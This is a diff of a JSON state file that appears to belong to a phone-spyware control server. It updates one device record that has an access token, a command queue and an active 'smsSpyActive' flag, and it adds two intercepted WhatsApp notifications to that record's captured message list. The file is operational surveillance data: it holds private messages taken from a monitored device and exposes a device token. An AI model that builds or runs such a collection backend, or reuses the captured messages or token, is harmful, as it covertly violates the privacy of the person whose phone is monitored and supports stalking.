@@ -36,7 +36,7 @@
     "deviceName": "HP-BUGV2-9679",
     "ownerUsername": "gehgtg17",
     "token": "074c70324689a6d895cd017b2b0059b6",
-    "lastSeen": 1776082812788,
+    "lastSeen": 1776082827795,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-13T11:23:24.956Z",
@@ -52,6 +52,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "k",
+        "content": "Zamrah: @⁨~Dimz Stock⁩",
+        "time": "13/04 19:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776082829519
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "k: Zamrah",
+        "content": "@⁨~Dimz Stock⁩",
+        "time": "13/04 19:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776082829433
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
